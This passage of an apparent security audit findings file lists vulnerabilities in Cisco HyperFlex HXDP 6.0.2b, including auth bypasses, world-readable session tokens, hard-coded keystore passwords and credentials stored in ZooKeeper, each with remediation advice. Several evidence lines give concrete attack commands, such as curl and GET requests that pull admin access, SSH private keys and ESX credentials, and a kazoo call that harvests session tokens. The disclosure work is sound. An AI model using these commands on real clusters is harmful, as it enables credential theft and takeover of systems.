    "cvss": 9.8,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
    "cwe": "CWE-732",
    "component": "storfs-misc/set_shared_key.sh, storfs-misc/genrestconf.sh, storfs-misc/rest_internal.conf",
    "description": (
        "set_shared_key.sh generates the HyperFlex root session ID as "
        "`sharedkey=$product_uuid-$RANDOM` (15 bits of additional entropy above "
        "the semi-public product UUID) and writes it to /etc/hyperflex/secure/root_file.pub "
        "with explicit `chmod 644` — making the file world-readable by all local users. "
        "genrestconf.sh reads this token and injects it into the nginx proxy config as "
        "`proxy_set_header X-RootSessionID <token>`, causing nginx to add admin "
        "authentication to all internally proxied requests. "
        "runRestQueries(useRootSessionId=True) in multiple scripts reads the same file "
        "and constructs requests with X-RootSessionID, X-LoggedInUser: admin, "
        "X-Scope: READ,MODIFY, and X-RequestInitiator: Internal headers. "
        "A local attacker (diag account, daemon user, web process) can: "
        "(1) read /etc/hyperflex/secure/root_file.pub (mode 0644); "
        "(2) send any REST API request with X-RootSessionID: <token> and "
        "X-LoggedInUser: admin to gain full admin-level READ+MODIFY access to "
        "the HyperFlex coreapi; "
        "(3) enumerate, modify, or destroy cluster configuration, credentials, "
        "encryption keys, and node membership. "
        "Additionally, the $RANDOM portion of the key is only 15 bits (0-32767), "
        "so even without file read, an attacker who knows the product_uuid can "
        "brute-force the full key space in at most 32768 guesses."
    ),
    "evidence": [
        "set_shared_key.sh:11: sharedkey=$nodeid-$RANDOM  # nodeid = product_uuid",
        "set_shared_key.sh:12: echo $sharedkey > $dest_folder/root_file.pub",
        "set_shared_key.sh:13: chmod 644 $dest_folder/root_file.pub  # world-readable confirmed",
        "genrestconf.sh:8: SESSIONFILE=/etc/hyperflex/secure/root_file.pub",
        "genrestconf.sh:31: sed 's/SESSIONID/$SESSIONID/g' rest_internal.conf -> /etc/nginx/conf.d/restnginx.conf",
        "rest_internal.conf:42: proxy_set_header X-RootSessionID SESSIONID;",
        "commonFunctions.py:615-620: useRootSessionId=True -> X-RootSessionID + X-LoggedInUser:admin + X-Scope:READ,MODIFY",
        "migrate-secureconfig.sh:15: /etc/root_file.pub -> /etc/hyperflex/secure/ (legacy path may persist)",
        "Forged request: GET https://<hx>/coreapi/v1/clusters -H 'X-RootSessionID:<token>' -H 'X-LoggedInUser:admin'",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Change chmod to 0600 (owner-read only) in set_shared_key.sh immediately. "
        "Replace $RANDOM with /dev/urandom-sourced entropy: "
        "`sharedkey=$(head -c 32 /dev/urandom | base64 | tr -d '/+=')`. "
        "Add cryptographic HMAC validation of X-RootSessionID at the API filter layer "
        "rather than trusting the header value verbatim. "
        "Audit all paths that read root_file.pub to ensure they run as appropriately "
        "privileged users."
    ),
    "tags": ["auth-bypass", "world-readable", "session-id", "nginx", "admin", "cwe-732", "cwe-334", "critical"],
}

HX_F174 = {
    "id": "HX-F174",
    "title": "Java Keystore Password Hard-Coded as 'springpath' in hyperflex_security.properties",
    "severity": "HIGH",
    "cvss": 7.5,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-321",
    "component": "storfs-misc/hyperflex_security.properties, storfs-misc (keystore: hyperflex_keystore.jceks)",
    "description": (
        "hyperflex_security.properties contains the Java keystore password obfuscated with "
        "base64 only: `keystore_password = c3ByaW5ncGF0aA==` which decodes to 'springpath'. "
        "This is the same password used as ssl_cert_passwd in springpath_default.tunes (HX-F159) "
        "and as the ESX_PWD class-level default in configureNetworking_VCenter.py (HX-F166). "
        "An attacker who reads hyperflex_security.properties can unlock hyperflex_keystore.jceks "
        "and extract the TLS private key and other cryptographic material stored therein. "
        "The properties file is shipped at /usr/share/hyperflex/storfs-misc/ and is migrated to "
        "/etc/hyperflex/secure/ by migrate-secureconfig.sh alongside the keystore. "
        "The firmware-wide reuse of 'springpath' across TLS certificate storage, keystore, "
        "and ESX host authentication creates a single password that unlocks multiple "
        "independent cryptographic boundaries."
    ),
    "evidence": [
        "hyperflex_security.properties: <entry key='keystore_password'>c3ByaW5ncGF0aA==</entry>",
        "base64.b64decode('c3ByaW5ncGF0aA==') = b'springpath'  # VERIFIED",
        "springpath_default.tunes: ssl_cert_passwd -> 'springpath' (same password, HX-F159)",
        "configureNetworking_VCenter.py:319: ESX_PWD = 'springpath' (HX-F166)",
        "migrate-secureconfig.sh:15: /etc/hyperflex_keystore.jceks -> /etc/hyperflex/secure/",
        "keytool -list -keystore hyperflex_keystore.jceks -storepass springpath  # unlocks keystore",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Generate a unique, random keystore password per deployment. Store it using "
        "OS-level credential management (not base64 in a properties file). "
        "Rotate all uses of 'springpath' across TLS cert storage, keystore, and ESX "
        "authentication — they must not share a password. Use distinct credentials per domain."
    ),
    "tags": ["hardcoded-creds", "keystore", "springpath", "password-reuse", "cwe-321", "cwe-798"],
}

HX_F175 = {
    "id": "HX-F175",
    "title": "Plaintext SSH Password Written to stderr/Queue on Paramiko Connection Failure in uninstall_cluster.py",
    "severity": "MEDIUM",
    "cvss": 5.5,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-312",
    "component": "storfs-deploy/ansible/uninstall_cluster.py",
    "description": (
        "execute_ssh() in uninstall_cluster.py catches paramiko connection exceptions and "
        "constructs a stderr string that includes the plaintext password: "
        "`stderr = ('Paramiko ssh connect exception: %s, host %s user: %s password: %s' % "
        "(e, address, username, password))`. This string is then placed into a queue "
        "(`q.put([stdout, stderr, -1])`) for downstream consumption and logging. "
        "Any SSH connection failure (wrong host key due to the AutoAddPolicy MITM vector, "
        "authentication failure, network error) causes the password to be written to "
        "the result queue and potentially propagated to log files, syslog, or exception "
        "handlers that display or store the result. "
        "Combined with `paramiko.AutoAddPolicy()` at line 64 (MITM accepted silently), "
        "an attacker intercepting the SSH connection can trigger a connection failure "
        "and cause the credential to be exposed in the queue/log output."
    ),
    "evidence": [
        "uninstall_cluster.py:64: client.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "uninstall_cluster.py:69: stderr = ('...password: %s' % (e, address, username, password))",
        "uninstall_cluster.py:71: q.put([stdout, stderr, -1])  # password propagated to caller",
        "logger.error at line 67-68 also logs exception details (potentially including auth failure text)",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Remove the password field from the exception string entirely — log only "
        "the exception type and address. Never include credentials in log messages or "
        "exception strings. Fix the AutoAddPolicy to use a known_hosts or pinned host key."
    ),
    "tags": ["cleartext-creds", "logging", "ssh", "paramiko", "cwe-312", "cwe-532", "cwe-295"],
}

HX_F176 = {
    "id": "HX-F176",
    "title": "Privileged Proxy Port 8997 Binds to All Interfaces; nginx Auto-Injects Admin Session ID",
    "severity": "CRITICAL",
    "cvss": 9.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-284",
    "component": "storfs-misc/rest_internal.conf, storfs-misc/restintport.cfg, storfs-misc/genrestconf.sh",
    "description": (
        "rest_internal.conf configures nginx to listen on port 8997 (from restintport.cfg) "
        "with `listen *:PORT ssl` — binding to ALL network interfaces, not just loopback. "
        "For every request received on port 8997, nginx automatically injects "
        "`proxy_set_header X-RootSessionID <session_id>` before proxying to the backend "
        "at localhost:8000 (management API). nginx proxy_set_header overwrites any "
        "client-supplied X-RootSessionID with the real admin session ID. "
        "Consequently, ANY client that can establish a TCP connection to port 8997 "
        "on any ctlVM interface receives admin-level authenticated access to the full "
        "HyperFlex REST API (/rest, /aaa, /coreapi, /dataprotection, /backupservice, "
        "/encryption, /volume, /securityservice, /supportservice, /slservice, /upgrade, "
        "/upload, /stMgr) without supplying credentials. "
        "Port 8997 is used by the stCli tool from remote hosts (stCli.sh: "
        "springpath_host=clusterIp; springpath_port=8997) confirming the port is "
        "network-accessible. The design intent comment ('Data network on custom port') "
        "assumes network isolation, but the binding is *:8997 — no interface restriction. "
        "An attacker on any network segment that can reach the ctlVM on port 8997 "
        "has unauthenticated admin access to the entire cluster management API."
    ),
    "evidence": [
        "rest_internal.conf:4: listen *:PORT ssl;  # PORT=8997 from restintport.cfg",
        "restintport.cfg: PORT=8997",
        "rest_internal.conf:42: proxy_set_header X-RootSessionID SESSIONID;  # injected for ALL requests",
        "rest_internal.conf:72: proxy_set_header X-RootSessionID SESSIONID;  # stMgr path also",
        "genrestconf.sh: comment: 'binding is available only for Data network on custom port'",
        "stCli.sh:12: export springpath_host=${clusterIp}; export springpath_port=8997",
        "Attack: curl -k https://<ctlvm>:8997/coreapi/v1/clusters -> 200 admin response",
        "rest_internal.conf covers: /rest /aaa /coreapi /dataprotection /backupservice /encryption /volume /securityservice /supportservice /slservice /upgrade /upload /stMgr",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Change `listen *:PORT ssl` to `listen 127.0.0.1:PORT ssl` to restrict port 8997 "
        "to loopback only. The stCli tool should connect via the standard port 443 with "
        "explicit credentials rather than the privileged proxy port. "
        "If the data network must be used, bind explicitly to the data interface IP "
        "rather than wildcard, and add a firewall rule restricting access to the ctlVM itself."
    ),
    "tags": ["auth-bypass", "privileged-port", "nginx", "session-injection", "network", "cwe-284", "critical"],
}

HX_F177 = {
    "id": "HX-F177",
    "title": "Unauthenticated Access to /tmp/ Directory via Unauthenticated /sbdl/ nginx Path",
    "severity": "CRITICAL",
    "cvss": 9.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-284",
    "component": "storfs-misc/nginx.conf",
    "description": (
        "nginx.conf maps the /sbdl/ path to the system /tmp/ directory with no "
        "authentication: `location /sbdl/ { alias /tmp/; auth_basic off; }`. "
        "Any file in /tmp/ is downloadable by an unauthenticated remote attacker via "
        "`GET http://<ctlvm>/sbdl/<filename>`. This path was intended for support bundle "
        "downloads but the directory alias exposes the entire /tmp/ tree. "
        "Critical files known to be written to /tmp/ during normal operations: "
        "(1) `/tmp/sshKeyPair*.json` — SSH private keys for all storage controller VMs "
        "(generated by generateSshKeys.py, referenced in commonFunctions.py and "
        "0007_create_authorized_keys_for_admin_ESX.py — HX-F164/HX-F169); "
        "(2) `/tmp/upgradeHooksCreds*.json` — plaintext ESX username and password "
        "(referenced in all upgrade hook scripts — HX-F169); "
        "(3) `/tmp/nodeInventory*.json` — cluster node topology; "
        "(4) `/tmp/clusterConfig*.json` — cluster configuration data. "
        "An attacker who sends GET requests to /sbdl/ during a cluster upgrade or "
        "node replacement operation recovers SSH private keys for all nodes and ESX "
        "credentials without authentication."
    ),
    "evidence": [
        "nginx.conf:63-66: location /sbdl/ { alias /tmp/; auth_basic off; }",
        "commonFunctions.py:645: credsFile = getMatchingFileName('/tmp/sshKeyPair*.json')",
        "generateSshKeys.py:46: sshKeysFileHandle, sshKeysFile = mkstemp(suffix='.json', prefix='sshKeyPair', dir='/tmp')",
        "0007_create_authorized_keys_for_admin_ESX.py:20: JSON_CREDS_FILE_MATCH = '/tmp/upgradeHooksCreds*.json'",
        "Attack: GET http://<ctlvm>/sbdl/sshKeyPair<random>.json -> SSH private key for all nodes",
        "Attack: GET http://<ctlvm>/sbdl/upgradeHooksCreds<random>.json -> ESX plaintext credentials",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Restrict /sbdl/ to specific filenames matching the support bundle pattern "
        "(e.g. `location ~ ^/sbdl/supportBundle-[a-zA-Z0-9_-]+\\.tar\\.gz$`) rather "
        "than aliasing the entire /tmp/ directory. "
        "Move SSH key files, credential files, and node inventory files out of /tmp/ "
        "to a directory that is not nginx-served. "
        "If /tmp/ aliasing is necessary for legacy reasons, add auth_basic with credentials "
        "or restrict with `allow 127.0.0.1; deny all`."
    ),
    "tags": ["auth-bypass", "file-read", "tmp", "nginx", "ssh-keys", "cwe-284", "critical"],
}

HX_F178 = {
    "id": "HX-F178",
    "title": "Audit Log Gap — GET Requests Excluded from Audit Trail",
    "severity": "HIGH",
    "cvss": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-778",
    "component": "upgrade-war/WEB-INF/classes/application.conf",
    "description": (
        "application.conf sets `auditHttpVerbsToSkip = [\"GET\"]`, which suppresses audit "
        "log entries for all HTTP GET requests across the HyperFlex REST API. "
        "All data exfiltration operations that use GET — cluster node inventory, SSH keys, "
        "datastore configuration, network topology, user enumeration — leave no trace in "
        "the audit log. An attacker who has exploited unauthenticated read access "
        "(e.g. via X-RootSessionID on port 8997 — HX-F176, or /sbdl/ exposure — HX-F177) "
        "can exfiltrate the entire management plane over GET requests without generating "
        "any audit events. "
        "Cisco HyperFlex markets audit logging as a compliance control; the GET exclusion "
        "silently voids that guarantee for all read operations. "
        "The same configuration is present in both upgrade-war and enc-war deployments."
    ),
    "evidence": [
        "upgrade-war/WEB-INF/classes/application.conf:49: auditHttpVerbsToSkip = [\"GET\"]",
        "enc-war/WEB-INF/classes/application.conf:49: auditHttpVerbsToSkip = [\"GET\"]",
        "REST API read endpoints (coreapi/v1/clusters, coreapi/v1/nodes, etc.) all use GET",
        "Chain: HX-F176 (X-RootSessionID bypass) + HX-F178 = undetected admin API exfil",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Remove `auditHttpVerbsToSkip` or restrict it to only truly non-sensitive paths "
        "(e.g. health checks, favicon). "
        "At minimum, audit all GET requests to authenticated API namespaces "
        "(`/coreapi/`, `/rest/`, `/aaa/`, `/dataprotection/`). "
        "SIEM correlation rules should alert on high GET volume from a single source "
        "to compensate until patched."
    ),
    "tags": ["audit-bypass", "evasion", "compliance", "cwe-778", "high"],
}

HX_F179 = {
    "id": "HX-F179",
    "title": "Excessive JWT Lifetime — Default Token Valid for ~18 Days",
    "severity": "HIGH",
    "cvss": 6.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-613",
    "component": "upgrade-war/WEB-INF/classes/application.conf",
    "description": (
        "application.conf sets `defaultTokenLifeTime = 1555200000` milliseconds, "
        "which equals exactly 18 days (1555200 seconds). "
        "A valid JWT token issued by the HyperFlex AAA service (`/aaa/v1/auth`) "
        "remains valid for 18 days without revocation. "
        "This window dramatically extends the exploitability of any credential compromise: "
        "an attacker who captures a token via network sniffing (TLS bypass — HX-F157), "
        "process inspection (HX-F169), or log file access retains administrative access "
        "for up to 18 days after the credential is changed. "
        "Combined with `auditHttpVerbsToSkip=[\"GET\"]` (HX-F178), persistent read access "
        "remains undetected for the full token lifetime. "
        "NIST SP 800-63B recommends access token lifetimes of at most 12 hours for "
        "privileged administrative interfaces."
    ),
    "evidence": [
        "upgrade-war/WEB-INF/classes/application.conf:53: defaultTokenLifeTime = 1555200000",
        "enc-war/WEB-INF/classes/application.conf:53: defaultTokenLifeTime = 1555200000",
        "1555200000 ms / 1000 / 60 / 60 / 24 = 18 days",
        "defaultIdleTimeout = 1800000 ms (30 min idle), but JWT expiry is separate and 18-day",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Reduce `defaultTokenLifeTime` to 3600000 (1 hour) for administrative sessions "
        "or at most 43200000 (12 hours). "
        "Implement refresh token pattern: short-lived access tokens with "
        "explicit re-authentication for refresh. "
        "Add token revocation endpoint and call it on any password change or "
        "suspected compromise event."
    ),
    "tags": ["token-lifetime", "session-management", "cwe-613", "high"],
}

HX_F180 = {
    "id": "HX-F180",
    "title": "Session Pool Exhaustion DoS — maxTotalSessions=16 Cluster-Wide Cap",
    "severity": "MEDIUM",
    "cvss": 5.3,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
    "cwe": "CWE-400",
    "component": "auth-war/WEB-INF/classes/application.conf",
    "description": (
        "application.conf sets `maxTotalSessions = 16` with `maxSessionsPerUser = 8`. "
        "The 16-session global cap covers all users across the entire cluster management plane. "
        "An attacker with credentials for two accounts can open 8 sessions each, exhausting "
        "the global pool and preventing all other users (including administrators) from "
        "authenticating. "
        "Combined with `defaultTokenLifeTime = 1555200000ms` (18 days — HX-F179), "
        "a session pool hold can persist for 18 days without any forced expiry. "
        "The `failedLoginLockoutTimeInSec = 120` (2-minute lockout) and "
        "`maxFailedLogins = 10` parameters also mean an attacker can perform 10 "
        "authentication attempts per 2 minutes against any account without triggering "
        "a persistent lockout — effective credential brute-force rate of ~3600 attempts/hour."
    ),
    "evidence": [
        "auth-war/WEB-INF/classes/application.conf:52: maxSessionsPerUser = 8",
        "auth-war/WEB-INF/classes/application.conf:53: maxTotalSessions = 16",
        "auth-war/WEB-INF/classes/application.conf:47: defaultTokenLifeTime = 1555200000",
        "auth-war/WEB-INF/classes/application.conf:51: maxFailedLogins = 10",
        "auth-war/WEB-INF/classes/application.conf:55: failedLoginLockoutTimeInSec = 120",
        "2 accounts x 8 sessions = 16 = pool exhausted; all other auths rejected",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Increase `maxTotalSessions` to at least 200 for a realistic multi-administrator cluster. "
        "Implement idle session reaping that is independent of `defaultIdleTimeout` UI behavior. "
        "Reduce `maxSessionsPerUser` to 3-4 and enforce it. "
        "Increase `maxFailedLogins` lockout duration from 120s to 900s (15 min) "
        "to raise the cost of credential brute-force."
    ),
    "tags": ["dos", "session-exhaustion", "brute-force", "cwe-400", "medium"],
}

HX_F181 = {
    "id": "HX-F181",
    "title": "LUKS Encryption Key Derived from Disk UUID — Physical Access Bypasses Encryption",
    "severity": "HIGH",
    "cvss": 7.0,
    "cvss_vector": "CVSS:3.1/AV:P/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
    "cwe": "CWE-321",
    "component": "storfs-appliance/sw-sed.py",
    "description": (
        "sw-sed.py uses the disk UUID (as returned by `mkfs.storfs -- --list`) as the "
        "LUKS passphrase for all storage drives: "
        "`child.sendline(disk_uuid)` for both passphrase entry and verification during "
        "`cryptsetup luksFormat`, and again during `cryptsetup luksOpen`. "
        "The disk UUID is stored in the drive's device metadata and is readable from "
        "the LUKS header itself without any authentication. "
        "An attacker with physical access to a removed disk can: "
        "(1) read the UUID from drive partition metadata or UUID field in `blkid` output; "
        "(2) use it directly as the LUKS passphrase to decrypt the volume. "
        "Any local process with access to `blkid` output (readable without root on many "
        "configurations) can also derive the passphrase for any mounted volume. "
        "LUKS provides no security guarantees when the passphrase is collocated with "
        "the encrypted data."
    ),
    "evidence": [
        "sw-sed.py:115: child.sendline(disk_uuid)  # LUKS format passphrase = disk UUID",
        "sw-sed.py:117: child.sendline(disk_uuid)  # LUKS format passphrase verification = disk UUID",
        "sw-sed.py:143: child.sendline(duuids[disk_name])  # LUKS open passphrase = disk UUID",
        "disk_uuid sourced from mkfs.storfs -- --list col[0] (line 103)",
        "LUKS header contains unencrypted UUID and key material hash; passphrase derivable",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Generate LUKS passphrases using a cryptographically secure random source "
        "(`os.urandom(32)`) and store them in a key management system (KMIP/Vault), "
        "NOT derived from any disk property. "
        "Alternatively, integrate with a TPM-backed key escrow so the disk UUID "
        "is at most a non-secret index into the key store — not the passphrase itself. "
        "At minimum, derive the passphrase via HKDF from a cluster-secret + disk UUID "
        "so the disk UUID alone is not sufficient."
    ),
    "tags": ["crypto", "luks", "disk-encryption", "physical-access", "cwe-321", "high"],
}

HX_F182 = {
    "id": "HX-F182",
    "title": "ESX Password Exposed in Ansible Extra-Vars Process Arguments",
    "severity": "HIGH",
    "cvss": 6.5,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-214",
    "component": "storfs-factory/ansible/factory_deploy.py",
    "description": (
        "factory_deploy.py passes the ESX password as a plaintext Ansible extra-var "
        "in the process argument list. After the script masks the password in its log "
        "output (line 49-50), it restores the base64-encoded password (line 51) and "
        "passes it directly to os.execlpe via `--extra-vars esxPassword=<b64pw>` "
        "(lines 81-90). "
        "The base64-encoded password appears verbatim in `ps aux` and `/proc/<pid>/cmdline` "
        "for the duration of the Ansible playbook execution. "
        "Any local user with access to the process list can read the value and decode it "
        "with `echo '<b64pw>' | base64 -d` to recover the ESX root password. "
        "The password is not flagged as a no_log variable in the playbook, so it also "
        "appears in Ansible verbose logs at `-vvvv` (the hardcoded verbosity level "
        "at line 90)."
    ),
    "evidence": [
        "factory_deploy.py:46-51: b64 encode then restore password after log masking",
        "factory_deploy.py:81-90: os.execlpe passes --extra-vars esxPassword=<b64pw>",
        "factory_deploy.py:90: -vvvv verbosity hardcoded — Ansible logs all extra-vars",
        "factory_deploy.py:85: --extra-vars esxUserName=%s (also exposed)",
        "Attack: ps aux | grep factory_deploy -> base64 decode --extra-vars value",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Pass credentials to Ansible via vault-encrypted vars file or environment variable "
        "(`ANSIBLE_EXTRA_VARS_FILE`) rather than command-line `--extra-vars`. "
        "If command-line passing is unavoidable, use Ansible Vault to encrypt the "
        "esxPassword var and pass the vault password file reference, not the plaintext. "
        "Remove `-vvvv` hardcoded verbosity or mark `esxPassword` with `no_log: true` "
        "in all tasks that reference it. "
        "Use a named pipe or stdin-based injection to avoid the value appearing in /proc/cmdline."
    ),
    "tags": ["process-args", "credential-exposure", "ansible", "esx", "cwe-214", "high"],
}

HX_F183 = {
    "id": "HX-F183",
    "title": "Cluster UUID as ZooKeeper Authentication Token — Same Value as AES Encryption Key",
    "severity": "HIGH",
    "cvss": 7.8,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
    "cwe": "CWE-798",
    "component": "stcli-egg/stCli/postEvent.py; storfs-misc/upgrade-hooks/.../0008_cleanup_historical_job_ESX.py",
    "description": (
        "The cluster UUID (`/etc/hyperflex/clusteruuid`) is used as the shared "
        "authentication token for the ZooKeeper ensemble. "
        "`add_auth('UUID', '<clientId>;<cluster_uuid>')` is called with the cluster UUID "
        "as the credential material. This is the same UUID used as the AES encryption key "
        "in convertUUIDAndEncryptData.py (HX-F172): "
        "SHA-256(cluster_uuid)[0:16] = AES key. "
        "The cluster UUID is therefore the load-bearing secret for two independent "
        "security controls: (1) ZooKeeper access control and (2) data-at-rest encryption. "
        "An attacker who recovers the cluster UUID via any path (API, process inspection, "
        "log file, `/sbdl/` nginx path — HX-F177) can: "
        "(a) authenticate to ZooKeeper and read/write all cluster state "
        "(session tokens, node configuration, distributed locks, scheduling data); "
        "(b) decrypt all AES-ECB-protected configuration values. "
        "Because ZooKeeper is configured via application.conf `zkAuthClientId` fields "
        "across multiple services (aaa, hxSvcMgr, stNodeMgr, hxLicenseSvc, hxtoolbox), "
        "ZK auth bypass affects the entire management plane."
    ),
    "evidence": [
        "postEvent.py:178-180: auth_data = 'postEvent;' + cluster_uuid; zkClient.add_auth('UUID', auth_data)",
        "0008_cleanup_historical_job_ESX.py:114-116: auth_data = 'zkjobdelete;' + cluster_uuid; add_auth('UUID', auth_data)",
        "postEvent.py:213: /etc/hyperflex/clusteruuid (auth token source)",
        "0008_cleanup_historical_job_ESX.py:152: /etc/springpath/clusteruuid (auth token source)",
        "convertUUIDAndEncryptData.py:key = hashlib.sha256(bytes(cluster_uuid, 'utf-8')).digest()[0:16] (same UUID -> AES key)",
        "application.conf: zkAuthClientId = 'aaa'/'hxSvcMgr'/'stNodeMgr'/'hxLicenseSvc' — all use UUID scheme",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Issue independent cryptographic credentials for ZooKeeper authentication "
        "and AES key derivation. The ZK auth token should be a randomly generated "
        "secret stored in a secrets manager, not the cluster UUID. "
        "Rotate the cluster UUID without impacting encryption or ZK auth by decoupling "
        "UUID-as-identifier from UUID-as-secret. "
        "Use dedicated per-service ZK credentials derived from a cluster master secret, "
        "not a shared UUID."
    ),
    "tags": ["zookeeper", "auth", "shared-secret", "cluster-uuid", "cwe-798", "high"],
}

HX_F184 = {
    "id": "HX-F184",
    "title": "ZooKeeper Authentication Token Logged in Plaintext at INFO Level",
    "severity": "MEDIUM",
    "cvss": 5.5,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-532",
    "component": "storfs-misc/upgrade-hooks/.../0008_cleanup_historical_job_ESX.py; stcli-egg/stCli/postEvent.py",
    "description": (
        "When ZooKeeper authentication is enabled (`useZKAuth=true` in storfs.cfg), "
        "the full authentication token (including the cluster UUID) is logged at "
        "INFO level before the `add_auth` call. "
        "0008_cleanup_historical_job_ESX.py line 115: "
        "`logger.info('Setting ZK Auth {}'.format(auth_data))` where auth_data = "
        "`'zkjobdelete;<cluster_uuid>'`. "
        "postEvent.py line 179: "
        "`self.logger.debug('Setting ZK Auth {}'.format(auth_data))` — "
        "also in DEBUG logs. "
        "INFO-level logs are typically forwarded to SIEM/syslog, stored persistently "
        "in `/var/log/hyperflex/`, and included in support bundles downloadable via "
        "the `/sbdl/` nginx path (HX-F177). "
        "An attacker who reads any log file recovers the cluster UUID, which is also "
        "the AES encryption key (HX-F172) and ZK auth token (HX-F183)."
    ),
    "evidence": [
        "0008_cleanup_historical_job_ESX.py:115: logger.info('Setting ZK Auth {}'.format(auth_data))",
        "postEvent.py:179: self.logger.debug('Setting ZK Auth {}'.format(auth_data))",
        "auth_data format: '<clientId>;<cluster_uuid>'",
        "Chain: log file in /var/log/ -> /sbdl/<logfile> (HX-F177) -> cluster UUID -> ZK auth + AES decrypt",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace `logger.info/debug('Setting ZK Auth {}'.format(auth_data))` with "
        "`logger.info('Setting ZK Auth for client: <clientId>')` — log only the "
        "client identity, never the credential material. "
        "Mask credentials in all log statements before writing: "
        "`auth_data_masked = auth_data.split(';')[0] + ';***'`."
    ),
    "tags": ["log-exposure", "cluster-uuid", "zookeeper", "cwe-532", "medium"],
}

HX_F185 = {
    "id": "HX-F185",
    "title": "All Active JWT Session Tokens Stored in Unauthenticated ZooKeeper",
    "severity": "CRITICAL",
    "cvss": 9.1,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
    "cwe": "CWE-312",
    "component": "mgmt/opt/hyperflex/clearsession.py; ZooKeeper /rest/aaa/session_table",
    "description": (
        "All active JWT session tokens for all users are stored in a single ZooKeeper "
        "node at path `/rest/aaa/session_table`. "
        "The node contains a JSON object mapping `accessToken -> sessionInfo` where "
        "sessionInfo includes `userName`. "
        "ZooKeeper at localhost:2181 is accessible by any local process without "
        "authentication (the ZKClient class uses `KazooClient(hosts=host)` with no "
        "`add_auth` call — HX-F183 auth scheme only applies when `useZKAuth=true` in "
        "storfs.cfg, which may not be the default deployment). "
        "An attacker who executes code as any local user can: "
        "(1) connect to ZK at localhost:2181; "
        "(2) read `/rest/aaa/session_table`; "
        "(3) harvest all active JWT tokens including administrator sessions; "
        "(4) use those tokens for API calls that are not audited (GET — HX-F178) "
        "for up to 18 days (HX-F179). "
        "Alternatively, if ZK auth is enabled, the cluster UUID is the shared secret "
        "(HX-F183) — recoverable via HX-F173/HX-F177/HX-F184 — granting ZK access "
        "with the same result."
    ),
    "evidence": [
        "clearsession.py:14: AAASessionTablePath = '/rest/aaa/session_table'",
        "clearsession.py:45: sessionTableJSON, version = getDataJSON(zk, AAASessionTablePath)",
        "clearsession.py:48: for accessToken, sessionInfo in list(sessionTable.items())",
        "zkclient.py:42: KazooClient(hosts=self.host, max_retries=5)  # no add_auth",
        "Attack: kazoo.client.KazooClient('localhost:2181').start(); zk.get('/rest/aaa/session_table')",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Do not store active JWT tokens in ZooKeeper. Maintain session state in a "
        "memory-only structure with a secure session database backed by a "
        "properly access-controlled store (Redis with auth, encrypted database). "
        "If ZooKeeper must be used for session data, enforce ZK ACLs on the "
        "`/rest/aaa/` subtree with per-service credentials, not the shared cluster UUID. "
        "Enable `useZKAuth=true` cluster-wide as a compensating control while "
        "the above is implemented."
    ),
    "tags": ["session-token", "zookeeper", "privilege-escalation", "cwe-312", "critical"],
}

HX_F186 = {
    "id": "HX-F186",
    "title": "SSO Manager Stores Hypervisor Credentials and Encryption Key Collocated in ZooKeeper",
    "severity": "CRITICAL",
    "cvss": 9.1,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
    "cwe": "CWE-312",
    "component": "storfs-mgmt/stSSOMgr-1.0/conf/application.conf; stSSOMgr-1.0.jar",
    "description": (
        "The SSO Manager service stores hypervisor credentials (vCenter/ESX passwords) "
        "and the encryption key that protects those credentials in adjacent ZooKeeper "
        "paths under the same base path. "
        "application.conf defines: `zkBasePath = '/stSSOMgr'`, `zkCredsKey = 'creds'` "
        "(credentials at `/stSSOMgr/creds`), and `zkEncryptionKey = 'keyData'` "
        "(encryption key at `/stSSOMgr/keyData`). "
        "The JAR confirms these operations: "
        "`getEncryptionKeyFromZK` reads the key, `setHypervHostCreds` writes encrypted "
        "credentials to ZK. "
        "Because both the ciphertext and the decryption key are in the same ZooKeeper "
        "tree, any actor who can read ZK (unauthenticated at localhost:2181 — HX-F185, "
        "or via cluster UUID — HX-F183) can: "
        "(1) read the encrypted credentials from `/stSSOMgr/creds`; "
